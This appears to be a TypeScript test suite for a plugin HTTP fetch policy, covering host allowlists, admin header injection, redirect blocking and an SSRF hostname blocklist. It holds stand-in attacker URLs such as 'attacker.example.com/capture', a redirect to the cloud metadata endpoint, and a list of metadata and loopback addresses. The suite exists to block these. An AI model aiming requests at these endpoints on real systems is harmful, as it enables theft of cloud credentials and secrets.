import { describe, it, expect, beforeEach, afterEach, vi } from "vite-plus/test";
import { buildFetch } from "../internal/fetch-policy";
import { isBlockedHostname, resolveAllowedHostsFromSchema } from "../internal/allowed-hosts";
import { registerSink, resetSinks } from "../../diagnostics/capture";
import type { DiagnosticSink } from "../../diagnostics/types";
import type { ErrorRecord } from "@nama/shared/diagnostics";

describe("buildFetch — static + dynamic allowlist", () => {
  beforeEach(() => {
    vi.stubGlobal(
      "fetch",
      vi.fn(async () => new Response("ok")),
    );
  });

  afterEach(() => {
    vi.unstubAllGlobals();
  });

  it("allows hosts present in the static list", async () => {
    const fetch = buildFetch("plug-static", ["api.trakt.tv"]);
    await expect(fetch("https://api.trakt.tv/path")).resolves.toBeInstanceOf(Response);
  });

  it("allows hosts present only in the dynamic set", async () => {
    const fetch = buildFetch("plug-dynamic", [], new Set(["plex.local"]));
    await expect(fetch("http://plex.local:32400/status")).resolves.toBeInstanceOf(Response);
  });

  it("rejects hosts that are in neither the static list nor the dynamic set", async () => {
    const fetch = buildFetch("plug-rejects", ["api.trakt.tv"], new Set(["plex.local"]));
    await expect(fetch("https://evil.example.com/x")).rejects.toMatchObject({
      code: "plugin.upstream_error",
    });
  });

  it("unions static + dynamic hosts — either membership is sufficient", async () => {
    const fetch = buildFetch("plug-union", ["api.themoviedb.org"], new Set(["my.plex.box"]));
    await expect(fetch("https://api.themoviedb.org/3/movie/1")).resolves.toBeInstanceOf(Response);
    await expect(fetch("http://my.plex.box:32400")).resolves.toBeInstanceOf(Response);
  });

  it("rejects invalid URLs with plugin.input_invalid", async () => {
    const fetch = buildFetch("plug-bad-url", ["api.trakt.tv"]);
    await expect(fetch("not a url")).rejects.toMatchObject({ code: "plugin.input_invalid" });
  });

  it("is case-insensitive for dynamic hostnames", async () => {
    const fetch = buildFetch("plug-case", [], new Set(["my.plex.box"]));
    await expect(fetch("https://My.Plex.Box/status")).resolves.toBeInstanceOf(Response);
  });
});

describe("buildFetch — admin allowlist + headers", () => {
  let captured: ErrorRecord[] = [];
  let fetchSpy: ReturnType<typeof vi.fn>;

  beforeEach(() => {
    captured = [];
    resetSinks();
    const sink: DiagnosticSink = {
      async captureError(record) {
        captured.push(record);
      },
    };
    registerSink(sink);
    fetchSpy = vi.fn(async () => new Response("ok"));
    vi.stubGlobal("fetch", fetchSpy);
  });

  afterEach(() => {
    vi.unstubAllGlobals();
    resetSinks();
  });

  // Flush microtasks so the fire-and-forget captureError promise lands
  // before assertions run.
  const flush = async () => {
    await Promise.resolve();
    await Promise.resolve();
  };

  it("null admin allowlist inherits manifest (no narrowing)", async () => {
    const fetch = buildFetch("plug-a", ["api.trakt.tv"], undefined, null);
    await expect(fetch("https://api.trakt.tv/x")).resolves.toBeInstanceOf(Response);
    await flush();
    expect(captured).toHaveLength(0);
  });

  it("admin allowlist narrows the manifest — concrete entry passes", async () => {
    const fetch = buildFetch("plug-a", ["api.trakt.tv", "api.tmdb.org"], undefined, [
      "api.trakt.tv",
    ]);
    await expect(fetch("https://api.trakt.tv/x")).resolves.toBeInstanceOf(Response);
    await flush();
    expect(captured).toHaveLength(0);
  });

  it("admin allowlist narrows the manifest — excluded host is blocked", async () => {
    const fetch = buildFetch("plug-a", ["api.trakt.tv", "api.tmdb.org"], undefined, [
      "api.trakt.tv",
    ]);
    await expect(fetch("https://api.tmdb.org/x")).rejects.toMatchObject({
      code: "plugin.upstream_error",
    });
    await flush();
    expect(captured).toHaveLength(1);
    expect(captured[0]).toMatchObject({
      code: "plugin.host_blocked_by_admin",
      severity: "warning",
      pluginId: "plug-a",
    });
  });

  it("admin allowlist = [] blocks every static host but leaves dynamic hosts reachable", async () => {
    const fetch = buildFetch("plug-a", ["api.trakt.tv"], new Set(["plex.local"]), []);
    await expect(fetch("https://api.trakt.tv/x")).rejects.toMatchObject({
      code: "plugin.upstream_error",
    });
    await expect(fetch("http://plex.local:32400")).resolves.toBeInstanceOf(Response);
    await flush();
    // Only the static-side block emits the audit event.
    expect(captured).toHaveLength(1);
    expect(captured[0]?.code).toBe("plugin.host_blocked_by_admin");
  });

  it("admin allowlist does not filter dynamic x-allowed-host set", async () => {
    // Admin restricts static to a concrete host; user-supplied plex.local
    // is still reachable via the dynamic set.
    const fetch = buildFetch("plug-a", ["api.trakt.tv"], new Set(["plex.local"]), ["api.trakt.tv"]);
    await expect(fetch("http://plex.local:32400")).resolves.toBeInstanceOf(Response);
    await flush();
    expect(captured).toHaveLength(0);
  });

  it("admin allowlist wildcards work — *.foo.com narrows to subdomains only", async () => {
    const fetch = buildFetch("plug-a", ["*"], undefined, ["*.foo.com"]);
    await expect(fetch("https://x.foo.com/a")).resolves.toBeInstanceOf(Response);
    await expect(fetch("https://bar.com/a")).rejects.toMatchObject({
      code: "plugin.upstream_error",
    });
  });

  it("manifest-miss does not emit an admin-block audit entry", async () => {
    // Host is not in the manifest at all; the admin list is irrelevant and no
    // admin-block violation should be recorded (it is a manifest-author miss,
    // not an admin-imposed block).
    const fetch = buildFetch("plug-a", ["api.trakt.tv"], undefined, null);
    await expect(fetch("https://evil.example.com/x")).rejects.toMatchObject({
      code: "plugin.upstream_error",
    });
    await flush();
    expect(captured).toHaveLength(0);
  });

  it("merges admin headers into the outbound request", async () => {
    const fetch = buildFetch("plug-a", ["api.trakt.tv"], undefined, null, {
      "X-Corp-Key": "abc",
      "X-Env": "prod",
    });
    await fetch("https://api.trakt.tv/x", { headers: { "User-Agent": "plugin" } });
    expect(fetchSpy).toHaveBeenCalledTimes(1);
    const [, init] = fetchSpy.mock.calls[0]!;
    const headers = init!.headers as Headers;
    expect(headers.get("x-corp-key")).toBe("abc");
    expect(headers.get("x-env")).toBe("prod");
    expect(headers.get("user-agent")).toBe("plugin");
  });

  it("admin headers override plugin-set headers on case-insensitive name match", async () => {
    const fetch = buildFetch("plug-a", ["api.trakt.tv"], undefined, null, {
      Authorization: "Bearer admin-override",
    });
    await fetch("https://api.trakt.tv/x", {
      headers: { authorization: "Bearer plugin-original" },
    });
    const [, init] = fetchSpy.mock.calls[0]!;
    const headers = init!.headers as Headers;
    expect(headers.get("authorization")).toBe("Bearer admin-override");
  });

  it("no admin headers forwards plugin init with redirect: manual added", async () => {
    const fetch = buildFetch("plug-a", ["api.trakt.tv"]);
    const init = { headers: { "X-Foo": "bar" } };
    await fetch("https://api.trakt.tv/x", init);
    // redirect: 'manual' is always set to prevent SSRF via open redirects.
    // Plugin headers are preserved as-is through the spread.
    expect(fetchSpy).toHaveBeenCalledWith("https://api.trakt.tv/x", {
      ...init,
      redirect: "manual",
    });
  });

  it("admin headers are NOT sent when only dynamicAllowed matched (credential leak prevention)", async () => {
    const fetch = buildFetch("plug-a", [], new Set(["attacker.example.com"]), null, {
      "X-Corp-Key": "secret-key",
    });
    await fetch("https://attacker.example.com/capture", { headers: { "User-Agent": "plugin" } });
    expect(fetchSpy).toHaveBeenCalledTimes(1);
    const [, init] = fetchSpy.mock.calls[0]!;
    const rawHeaders = init!.headers as Record<string, string> | Headers;
    const secretValue =
      typeof (rawHeaders as Headers).get === "function"
        ? (rawHeaders as Headers).get("x-corp-key")
        : ((rawHeaders as Record<string, string>)["X-Corp-Key"] ??
          (rawHeaders as Record<string, string>)["x-corp-key"]);
    expect(secretValue).toBeUndefined();
  });

  it("admin headers ARE sent when staticAllowed matched", async () => {
    const fetch = buildFetch("plug-b", ["api.trakt.tv"], undefined, null, {
      "X-Corp-Key": "secret-key",
    });
    await fetch("https://api.trakt.tv/x", {});
    expect(fetchSpy).toHaveBeenCalledTimes(1);
    const [, init] = fetchSpy.mock.calls[0]!;
    const headers = init!.headers as Headers;
    expect(headers.get("x-corp-key")).toBe("secret-key");
  });
});

describe("buildFetch — redirect prevention", () => {
  beforeEach(() => {
    vi.stubGlobal(
      "fetch",
      vi.fn(
        async () =>
          new Response(null, {
            status: 302,
            headers: { Location: "http://169.254.169.254/latest/meta-data/" },
          }),
      ),
    );
  });

  afterEach(() => {
    vi.unstubAllGlobals();
  });

  it("throws when upstream returns a redirect", async () => {
    const fetch = buildFetch("plug-redirect", ["api.example.com"]);
    await expect(fetch("https://api.example.com/path")).rejects.toMatchObject({
      code: "plugin.upstream_error",
    });
  });
});

describe("resolveAllowedHostsFromSchema", () => {
  it("returns empty set when schema is undefined", () => {
    expect(resolveAllowedHostsFromSchema("p", undefined, { baseUrl: "https://x" })).toEqual(
      new Set(),
    );
  });

  it("returns empty set when config is null/undefined", () => {
    const schema = {
      type: "object",
      properties: { baseUrl: { type: "string", "x-allowed-host": true } },
    };
    expect(resolveAllowedHostsFromSchema("p", schema, null)).toEqual(new Set());
    expect(resolveAllowedHostsFromSchema("p", schema, undefined)).toEqual(new Set());
  });

  it("extracts a single hostname from a top-level x-allowed-host field", () => {
    const schema = {
      type: "object",
      properties: { baseUrl: { type: "string", "x-allowed-host": true } },
    };
    expect(
      resolveAllowedHostsFromSchema("p", schema, { baseUrl: "https://plex.local:32400/foo" }),
    ).toEqual(new Set(["plex.local"]));
  });

  it("ignores properties not marked x-allowed-host", () => {
    const schema = {
      type: "object",
      properties: {
        baseUrl: { type: "string", "x-allowed-host": true },
        label: { type: "string" },
      },
    };
    expect(
      resolveAllowedHostsFromSchema("p", schema, {
        baseUrl: "https://plex.local",
        label: "ignored",
      }),
    ).toEqual(new Set(["plex.local"]));
  });

  it("descends into nested objects and arrays", () => {
    const schema = {
      type: "object",
      properties: {
        servers: {
          type: "array",
          items: {
            type: "object",
            properties: { url: { type: "string", "x-allowed-host": true } },
          },
        },
      },
    };
    expect(
      resolveAllowedHostsFromSchema("p", schema, {
        servers: [{ url: "https://a.example.com" }, { url: "https://b.example.com" }],
      }),
    ).toEqual(new Set(["a.example.com", "b.example.com"]));
  });

  it("throws plugin.invalid_base_url when an x-allowed-host value is not a valid URL", () => {
    const schema = {
      type: "object",
      properties: { baseUrl: { type: "string", "x-allowed-host": true } },
    };
    expect(() => resolveAllowedHostsFromSchema("p", schema, { baseUrl: "not-a-url" })).toThrow(
      expect.objectContaining({ code: "plugin.invalid_base_url" }),
    );
  });

  it("skips empty-string values without throwing", () => {
    const schema = {
      type: "object",
      properties: { baseUrl: { type: "string", "x-allowed-host": true } },
    };
    expect(resolveAllowedHostsFromSchema("p", schema, { baseUrl: "" })).toEqual(new Set());
  });

  it("descends into tuple-style items (array-of-schemas)", () => {
    // Plugins that declare tuple-shaped arrays (different schema per index)
    // must still surface x-allowed-host entries. The earlier `asRecord` path
    // silently skipped tuples because `items` is an array, not an object.
    const schema = {
      type: "object",
      properties: {
        endpoints: {
          type: "array",
          items: [
            { type: "string", "x-allowed-host": true },
            { type: "string", "x-allowed-host": true },
          ],
        },
      },
    };
    expect(
      resolveAllowedHostsFromSchema("p", schema, {
        endpoints: ["https://primary.example.com", "https://backup.example.com"],
      }),
    ).toEqual(new Set(["primary.example.com", "backup.example.com"]));
  });

  it("throws plugin.invalid_base_url when an x-allowed-host value resolves to a blocked hostname", () => {
    // Without the blocklist, a user-supplied baseUrl of http://169.254.169.254
    // would land in the dynamic allowlist and let ctx.fetch reach the cloud
    // instance-metadata service. The resolver must reject at collection time
    // so the hostname never enters the set.
    const schema = {
      type: "object",
      properties: { baseUrl: { type: "string", "x-allowed-host": true } },
    };
    expect(() =>
      resolveAllowedHostsFromSchema("p", schema, { baseUrl: "http://169.254.169.254/latest" }),
    ).toThrow(expect.objectContaining({ code: "plugin.invalid_base_url" }));
  });

  it("surfaces a readable path when x-allowed-host sits on the root schema", () => {
    // Root-level `x-allowed-host` is unusual but valid — the error message
    // substitutes `(root)` for the empty path so `'…'` does not render bare.
    const schema = { type: "string", "x-allowed-host": true } as const;
    expect(() => resolveAllowedHostsFromSchema("p", schema, "not-a-url")).toThrow(
      expect.objectContaining({
        code: "plugin.invalid_base_url",
        message: expect.stringContaining("'(root)'"),
      }),
    );
  });

  it("tuple items silently skip indexes with no corresponding value", () => {
    // Fewer values than tuple entries — unmatched indexes are simply unvisited
    // rather than thrown. Extra values beyond the tuple schema are also ignored
    // (the schema-walk is driven by the tuple length).
    const schema = {
      type: "object",
      properties: {
        endpoints: {
          type: "array",
          items: [
            { type: "string", "x-allowed-host": true },
            { type: "string", "x-allowed-host": true },
          ],
        },
      },
    };
    expect(
      resolveAllowedHostsFromSchema("p", schema, {
        endpoints: ["https://primary.example.com"],
      }),
    ).toEqual(new Set(["primary.example.com"]));
  });
});

describe("isBlockedHostname", () => {
  // Cloud instance-metadata endpoints: the primary SSRF attack class this
  // blocklist exists to defeat. Missing any one here means a user-controlled
  // x-allowed-host URL could reach credentials or sensitive metadata.
  it.each([
    ["169.254.169.254", "AWS / GCP / Azure IMDS"],
    ["fd00:ec2::254", "AWS IMDSv6"],
    ["100.100.100.200", "Alibaba metadata"],
    ["metadata.google.internal", "GCP metadata DNS"],
  ])("blocks %s (%s)", (hostname) => {
    expect(isBlockedHostname(hostname)).toBe(true);
  });

  // Loopback: both IPv4 and IPv6, including the less-obvious IPv4-mapped
  // IPv6 form that a naive string comparison would miss.
  it.each([
    ["localhost"],
    ["127.0.0.1"],
    ["127.1.2.3"],
    ["::1"],
    ["::ffff:127.0.0.1"],
    ["0.0.0.0"],
  ])("blocks loopback / unspecified %s", (hostname) => {
    expect(isBlockedHostname(hostname)).toBe(true);
  });

  // Link-local ranges outside the metadata block.
  it.each([["169.254.0.1"], ["169.254.200.200"], ["fe80::1"], ["fe80:0:0:0:0:0:0:1"]])(
    "blocks link-local %s",
    (hostname) => {
      expect(isBlockedHostname(hostname)).toBe(true);
    },
  );

  // URL.hostname wraps IPv6 in brackets — the blocklist must peel them off
  // before matching, otherwise `[::1]` would slip past the exact-match check.
  it("handles IPv6 addresses that arrive wrapped in brackets", () => {
    expect(isBlockedHostname("[::1]")).toBe(true);
    expect(isBlockedHostname("[fe80::1]")).toBe(true);
  });

  // Regression for issue #448: a trailing dot is RFC-equivalent to the
  // dotless form, so `localhost.` must hit the exact-match blocklist after
  // normalisation instead of bypassing it.
  it.each([["localhost."], ["metadata.google.internal."], ["localhost.."]])(
    "blocks trailing-dot variant %s",
    (hostname) => {
      expect(isBlockedHostname(hostname)).toBe(true);
    },
  );

  // Private networks are the expected topology for self-hosted deployments
  // (docker-compose, LAN Plex/Jellyfin). Blocking them would defeat the
  // design — these must keep working.
  it.each([
    ["192.168.1.10"],
    ["10.0.0.1"],
    ["172.16.5.1"],
    ["172.31.255.255"],
    ["fc00::1"],
    ["fd12:3456:789a::1"],
  ])("allows private-network address %s (by design)", (hostname) => {
    expect(isBlockedHostname(hostname)).toBe(false);
  });

  it("allows ordinary public hostnames", () => {
    expect(isBlockedHostname("api.trakt.tv")).toBe(false);
    expect(isBlockedHostname("plex.local")).toBe(false);
    expect(isBlockedHostname("my.plex.box")).toBe(false);
  });
});
